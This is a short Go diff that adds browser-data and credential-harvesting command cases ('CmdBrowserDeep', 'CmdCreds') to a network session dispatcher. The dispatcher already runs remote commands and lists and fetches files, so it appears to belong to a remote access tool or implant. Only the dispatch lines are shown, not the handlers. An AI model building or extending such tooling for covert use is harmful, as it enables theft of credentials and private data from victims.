@@ -125,6 +125,10 @@ func session(c net.Conn) int {
 				runCmd(c, string(fr.Payload))
 			case protocol.CmdBrowser:
 				handleBrowser(c)
+			case protocol.CmdBrowserDeep:
+				handleBrowserDeep(c)
+			case protocol.CmdCreds:
+				handleCreds(c, string(fr.Payload))
 			case protocol.CmdFsLs:
 				handleLS(c, string(fr.Payload))
 			case protocol.CmdFsGet:
